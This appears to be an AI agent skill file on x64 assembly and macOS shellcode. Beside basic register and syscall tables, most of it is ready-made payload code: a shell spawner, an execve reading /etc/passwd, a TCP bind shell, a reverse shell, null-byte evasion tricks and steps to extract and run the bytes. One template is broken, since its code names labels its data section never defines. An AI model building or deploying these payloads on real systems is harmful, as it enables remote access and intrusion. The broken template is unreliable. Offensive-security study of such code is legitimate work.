---
name: x64-macos-shellcode
description: Reference and templates for x64 assembly programming and macOS shellcode development. Use this skill whenever the user needs to understand x64 registers, calling conventions, write assembly code, create shellcode for macOS, work with syscalls, or needs quick reference for assembly instructions. Trigger for any x64/x86-64 assembly questions, macOS syscall work, shellcode creation, or reverse engineering tasks involving x64 architecture.
---

# x64 macOS Shellcode Reference

A comprehensive reference for x64 assembly programming and macOS shellcode development.

## Quick Reference

### x64 Registers

| Register | Primary Use | Size |
|----------|-------------|------|
| `rax` | Return values, accumulator | 64-bit |
| `rbx` | Base register for memory | 64-bit |
| `rcx` | Loop counters | 64-bit |
| `rdx` | Extended arithmetic | 64-bit |
| `rbp` | Base pointer (stack frame) | 64-bit |
| `rsp` | Stack pointer | 64-bit |
| `rsi` | Source index | 64-bit |
| `rdi` | Destination index | 64-bit |
| `r8-r15` | Additional general-purpose | 64-bit |

### macOS Calling Convention (System V)

- **First 6 parameters**: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`
- **Return value**: `rax`
- **Additional parameters**: Passed on stack
- **Stack alignment**: RSP must be 16-byte aligned before calls

### Common Instructions

| Instruction | Purpose | Example |
|-------------|---------|----------|
| `mov` | Move value | `mov rax, rbx` |
| `push`/`pop` | Stack operations | `push rax` / `pop rax` |
| `add`/`sub` | Arithmetic | `add rax, rcx` |
| `mul`/`div` | Multiplication/Division | `mul rdx` |
| `call`/`ret` | Function calls | `call function` |
| `cmp` | Compare values | `cmp rax, rdx` |
| `je`/`jne`/`jl` | Conditional jumps | `je label` |
| `syscall` | System call | `syscall` |
| `xor` | XOR operation | `xor rax, rax` |
| `lea` | Load effective address | `lea rdi, [rel label]` |

## macOS Syscalls

### Syscall Classes

```
SYSCALL_CLASS_NONE    0  /* Invalid */
SYSCALL_CLASS_MACH    1  /* Mach */
SYSCALL_CLASS_UNIX    2  /* Unix/BSD */
SYSCALL_CLASS_MDEP    3  /* Machine-dependent */
SYSCALL_CLASS_DIAG    4  /* Diagnostics */
SYSCALL_CLASS_IPC     5  /* Mach IPC */
```

### Unix/BSD Syscall Numbers

To call a Unix/BSD syscall, add `0x2000000` to the syscall number.

| Number | Syscall | Full Number |
|--------|---------|-------------|
| 1 | `exit` | `0x2000001` |
| 3 | `read` | `0x2000003` |
| 4 | `write` | `0x2000004` |
| 5 | `open` | `0x2000005` |
| 6 | `close` | `0x2000006` |
| 59 | `execve` | `0x200003b` |
| 65 | `socket` | `0x2000041` |
| 66 | `connect` | `0x2000042` |
| 68 | `bind` | `0x2000044` |
| 70 | `listen` | `0x2000046` |
| 74 | `accept` | `0x200004a` |
| 90 | `dup2` | `0x200005a` |

### Syscall Number Trick

To avoid null bytes in shellcode, use `bts rax, 25` to set bit 25 (adds `0x2000000`):

```asm
push    59        ; execve syscall number
pop     rax       ; move to RAX
bts     rax, 25   ; add 0x2000000 without null bytes
syscall
```

## Shellcode Templates

### Basic Shell (spawn /bin/zsh)

```asm
bits 64
section .text
global _main

_main:
    xor     rdx, rdx          ; zero RDX
    push    rdx               ; push NULL terminator
    mov     rbx, '/bin/zsh'   ; path to shell
    push    rbx               ; push path to stack
    mov     rdi, rsp          ; RDI = argv[0]
    push    59                ; execve syscall
    pop     rax               ; RAX = syscall number
    bts     rax, 25           ; add 0x2000000
    syscall
```

### Read File with Cat

Executes `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`

```asm
bits 64
section .text
global _main

_main:
    sub rsp, 40               ; allocate stack space
    
    lea rdi, [rel cat_path]   ; RDI = "/bin/cat"
    lea rsi, [rel passwd_path] ; RSI = "/etc/passwd"
    
    push rsi                  ; push "/etc/passwd"
    push rdi                  ; push "/bin/cat"
    mov rsi, rsp              ; RSI = argv array pointer
    
    xor rdx, rdx              ; RDX = NULL (no env)
    
    push    59                ; execve
    pop     rax
    bts     rax, 25
    syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```

### Execute Command via Shell

Executes `/bin/sh -c "<command>"`

```asm
bits 64
section .text
global _main

_main:
    sub rsp, 32               ; allocate stack space
    
    lea rdi, [rel command]    ; command string
    push rdi                  ; push command
    lea rdi, [rel sh_c]       ; "-c" option
    push rdi                  ; push "-c"
    lea rdi, [rel sh_path]    ; "/bin/sh"
    push rdi                  ; push "/bin/sh"
    
    mov rsi, rsp              ; RSI = argv array
    xor rdx, rdx              ; RDX = NULL
    
    push    59                ; execve
    pop     rax
    bts     rax, 25
    syscall

_exit:
    xor rdi, rdi              ; exit code 0
    push    1                 ; exit syscall
    pop     rax
    bts     rax, 25
    syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```

### Bind Shell (Port 4444)

Creates a TCP bind shell on port 4444.

```asm
section .text
global _main
_main:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; bind()
    mov  rsi, 0xffffffffa3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x68
    syscall

    ; listen()
    xor  rsi, rsi
    mov  sil, 0x2
    mov  rax, r8
    mov  al, 0x6a
    syscall

    ; accept()
    xor  rsi, rsi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x1e
    syscall

    ; dup2() for stdin/stdout/stderr
    mov rdi, rax
    mov sil, 0x3
dup2:
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    mov  rax, r8
    mov  al, 0x3b
    syscall
```

### Reverse Shell (127.0.0.1:4444)

Connects back to 127.0.0.1:4444.

```asm
section .text
global _main
_main:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; connect()
    mov  rsi, 0xfeffff80a3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x62
    syscall

    ; dup2() for stdin/stdout/stderr
    xor rsi, rsi
    mov sil, 0x3
dup2:
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x3b
    syscall
```

## Building Shellcode

### Compile Assembly to Object

```bash
nasm -f macho64 shell.asm -o shell.o
```

### Link to Executable

```bash
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```

### Extract Shellcode Bytes

Use the `extract-shellcode.sh` script in this skill's scripts directory, or:

```bash
# Method 1: Using objdump
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\x'$c
done

# Method 2: Using otool
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```

### Test Shellcode

Use the `test-shellcode.c` template in this skill's scripts directory. Compile with:

```bash
gcc test-shellcode.c -o loader
./loader
```

## Function Structure

### Prologue

```asm
push rbp              ; save caller's base pointer
mov rbp, rsp          ; set up new base pointer
sub rsp, <size>       ; allocate space for locals
```

### Epilogue

```asm
mov rsp, rbp          ; deallocate locals
pop rbp               ; restore caller's base pointer
ret                   ; return to caller
```

## Tips

1. **Avoid null bytes**: Use `bts rax, 25` to add `0x2000000` to syscall numbers
2. **Stack alignment**: Ensure RSP is 16-byte aligned before function calls
3. **Use `xor reg, reg`**: Efficient way to zero a register
4. **Use `lea` for addresses**: `lea rdi, [rel label]` loads address without null bytes
5. **Test incrementally**: Build and test each syscall separately before combining

## Resources

- [macOS syscall numbers](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)
- [Swift calling convention](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
- [macOS ARM64 Shellcode examples](https://github.com/daem0nc0re/macOS_ARM64_Shellcode)
- [Packet Storm Security shellcodes](https://packetstormsecurity.com/)
